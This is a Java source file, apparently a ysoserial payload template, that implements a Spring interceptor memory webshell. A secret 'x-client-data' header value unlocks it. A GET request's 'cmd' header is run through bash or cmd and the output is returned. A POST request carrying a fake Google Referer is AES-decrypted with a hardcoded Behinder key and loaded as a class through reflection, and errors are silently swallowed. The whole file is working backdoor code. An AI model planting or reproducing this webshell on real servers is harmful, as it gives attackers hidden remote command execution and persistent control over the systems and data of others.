package ysoserial.payloads.templates;

import org.apache.catalina.connector.Request;
import org.apache.tomcat.util.http.Parameters;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;


public class SpringInterceptorTemplate extends HandlerInterceptorAdapter {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        try {
            if (request.getHeader("x-client-data").equalsIgnoreCase("b14eadc8b152942dfcd697f0f3568d7214d15766843ae7928db19bec76d88572")) {
                if (request.getMethod().equals("GET")) {
                    String cmd = request.getHeader("cmd");
                    if (cmd != null && !cmd.isEmpty()) {
                        String[] cmds = null;
                        if (File.separator.equals("/")) {
                            cmds = new String[]{"/bin/bash", "-c", cmd};
                        } else {
                            cmds = new String[]{"cmd", "/c", cmd};
                        }
                        String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                        response.getWriter().println(result);
                        return false;
                    }
                } else if (request.getMethod().equals("POST") && request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                    try {
                        String payload = request.getReader().readLine();
                        if (payload.equals("null") || payload.isEmpty() || payload.equals(null)) {
                            payload = "";
                            // 解决在拦截器中 request.getReader().readLine()==null 的问题
                            Field field = request.getClass().getDeclaredField("request");
                            field.setAccessible(true);
                            Request realRequest = (Request) field.get(request);
                            Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
                            coyoteRequestField.setAccessible(true);
                            org.apache.coyote.Request coyoteRequest = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
                            Parameters parameters = coyoteRequest.getParameters();
                            Field paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
                            paramHashValues.setAccessible(true);
                            LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);

                            Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();

                            while (iterator.hasNext()) {
                                Map.Entry<String, ArrayList<String>> next = iterator.next();
                                payload = payload + next.getKey().replaceAll(" ", "+") + "=";
                                ArrayList<String> list = next.getValue();
                                String listString = "";
                                for (String s : list) {
                                    listString += s;
                                }
                                payload = payload + listString.replaceAll(" ", "+");
                            }
                        }

                        //create pageContext
                        HashMap pageContext = new HashMap();
                        HttpSession session = request.getSession();
                        pageContext.put("request", request);
                        pageContext.put("response", response);
                        pageContext.put("session", session);

                        String k = "e45e329feb5d925b"; // rebeyond
                        session.putValue("u", k);
                        Cipher c = Cipher.getInstance("AES");
                        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                        Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        method.setAccessible(true);
                        byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload));
                        Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                        evilclass.newInstance().equals(pageContext);
                        return false;

                    } catch (NoSuchFieldException e) {
                    } catch (Exception e) {
//                        e.printStackTrace();
                    }
                }
            }
        } catch (Exception e) {
        }
        return true;
    }
}
